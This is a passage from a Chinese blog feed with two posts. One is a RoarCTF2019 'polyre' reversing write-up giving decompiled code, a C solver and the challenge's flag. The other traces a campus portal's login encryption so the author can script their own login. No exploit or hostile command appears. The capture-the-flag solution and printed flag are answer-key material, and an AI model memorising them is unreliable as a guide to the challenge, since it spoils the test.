class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//输入部分，碰到\n截止</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v6;</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    v6 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = i;</span><br><span class="line">    v19 = v18 &lt; <span class="number">6</span>;<span class="comment">//这里可以看出只有6组</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];<span class="comment">//转为了QWORD，每组八个字节</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v27;</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = v25;</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      v7 = v29 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实最后看来也就是将输入的字符串分为6组，每组八个字节。然后作为long long 类型进行64次变换。</p><p>主要变换逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v27 = v4;</span><br><span class="line">    v28 = <span class="number">2</span> * v27;</span><br><span class="line">    v4 = v28;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v25 = <span class="number">2</span> * v4;</span><br><span class="line">    v26 = v25;</span><br><span class="line">    v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果大于0则直接*2，否则再异或一个0xB0004B7679FA26B3LL。</p><p>然后最后跟unk_402170做一个memcmp，那么就已知结果逆向输入了。主要我们需要怎么判断它是否&gt;0呢，其实很简单，我们可以看到如果&gt;0就单纯*2了，否则还会异或一个奇数，那么就从最低位的奇偶入手，如果是偶数则/2，如果不是那么就先异或再/2就好了。但是需要注意，负数/2并不能单纯右移一位，还要再高位添1才能保证是负数/2。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>据此写出脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0xAF</span>, <span class="number">0x90</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x8A</span>, <span class="number">0xC6</span>, <span class="number">0xA2</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x55</span>, </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xB0004B7679FA26B3</span>uLL;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *p=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)s;</span><br><span class="line">    <span class="keyword">int</span> iter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(iter&lt;<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k=*p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">                k^=key;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">                k |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            write(<span class="number">1</span>,((<span class="keyword">char</span> *)&amp; k)+j,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/6.png" alt="6"></p><p>flag:<code>flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>校园网模拟登录</title>
      <link href="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
      <url>/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。</p><span id="more"></span><h2 id="抓包获得请求方式"><a href="#抓包获得请求方式" class="headerlink" title="抓包获得请求方式"></a>抓包获得请求方式</h2><p>这里我用wireshark抓包，只抓从登录到登录成功这个时间段的包，这里主要分析我们发送的http的流量包。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>可以发现主要有两个流量包出现了username字段，那么主要分析这两个包内容的参数。第一个流量包内容如下</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>请求api为<code>http://10.110.74.99/cgi-bin/get_challenge</code></p><p>主要有四个参数，<code>callback</code>，<code>username</code>，<code>ip</code>，和<code>_</code>。callback参数不太确定，但是可以确定username是自己登录校园网的账号，ip就是自己本机在这个局域网下的ip，而<code>_</code>很明显就是时间戳。而可以看到call_back后面也有一个类似时间戳的参数。这个暂且不确定，但是后面反复抓包可以发现，这个参数就是固定的。至于本次请求是返回了什么我们可以照着参数打进去看看返回了什么数据，本人很菜，不是打web的，不会用burpsuite只能用这种办法了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>可以发现返回了一串json数据，里面主要有一个challenge字段，感觉是一个类似token的东西，其它的就没什么了，客户端ip，服务端ip，请求状态，产品版本和时间戳。而这里也方便了我们，可以直接从这里获取自己的ip了，但是网页端做这个估计主要还是为了这个token。但是这里并没有密码字段，还没有登录请求。</p><p>剩下的就看看另一个流量包</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>第二个流量包请求的api为<code>http://10.110.74.99/cgi-bin/srun_portal</code></p><p>请求的参数很多，首先依旧是callback，跟之前一样，action参数估计是标识本次请求类型为登录，第四个参数开始出现了密码字段，而这个很明显进行了md5加密，os指示操作系统类型，name为大概也是操作系统名称的意思。还有一个double_stack，虽然不懂但是反复抓包发现这个参数也是恒定不变是0，所以也不用去理解它的意思了。chksum参数是一串可能经过某种hash算法得到的值。info同样如此，只是它括起来的这个加密算法着实没听过。然后剩下的参数都是固定的就没必要去纠结了。</p><p>所以想要成功模拟登录，必须得到这些参数，需要计算的就只有password，chksum，info三个参数，那么去分析一下网页源码看看这三个参数是怎么得到的。</p><h2 id="分析网页js"><a href="#分析网页js" class="headerlink" title="分析网页js"></a>分析网页js</h2><p>F12查看，主要寻找登录按钮点击之后干干了什么</p><h3 id="password加密"><a href="#password加密" class="headerlink" title="password加密"></a>password加密</h3><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>可以看到只对前端进行了基本的校验之后调用了portal的login方法去登录，并且输入的用户名和密码也都传进了portal相应的变量当中，那么就去portal.js文件中分析。</p><p>发现文件很大，选择拷贝一份放ide中分析，寻找login函数，</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" alt="2"></p><p>可以发现这里主要是进行登录类型判断，进行选择，那就接着追踪。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>可以发现是用一个_loginAccount函数去登录的，而这个函数就在下面，我们看看它的逻辑。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>这里主要有一个getToken函数,然后密码用password和token进行了md5加盐的hash加密，因此password字段就很容易得出来了，那么我们接着看看token怎么获取的，之前我们通过手动请求猜测challenge字段是可能是token，这次我们跟踪_getToken函数看看。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>发现这里返回了res.challenge，那么就可以大胆推定刚刚的challenge就是token了。那么登录的流程应该就是，先去请求一个token，然后用token进行加密登录。这里先给出md5加密的脚本，这里参考了别的师傅的博客的做法，在这里—-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">传送门</a>，我也一直没理解它盐是怎么加的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="chksum和info加密"><a href="#chksum和info加密" class="headerlink" title="chksum和info加密"></a>chksum和info加密</h3><p>翻到后面可以直接看到url的请求参数。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>url可以直接抓包获得，这个没必要去分析它的url是啥，主要看我们之前需要知道的三个字段，这里第二点不太明白了，虽然看到它的挡路方式好像是OTP，但是抓包获得的一直是{md5}，也不太懂为啥，但是我们姑且选择后者，毕竟实践才是检验真理的唯一标准嘛。</p><p>这里password的hmd5我们前面已经可以算了，接下来这个info的参数是i，chksum的参数是sha1(str)，对str进行了sha1加密。那么我们往上看看这个i和这个str是怎么获得的。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>这里可以看到str只是对一些参数进行了相加，最后sha1散列。</p><p>那么如此一来我们只需要得到i就可以把整个url的参数构造完成了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>可以看到是调用了_encodeUserInfo函数去加密得到i的，那么我们进一步搜索这个函数的加密方式。</p><p>这里我直接贴出来这个加密的函数了。</p><h3 id="加密实现脚本"><a href="#加密实现脚本" class="headerlink" title="加密实现脚本"></a>加密实现脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 克隆自 $.base64，防止污染</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 设置 Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// 用户信息转 JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i 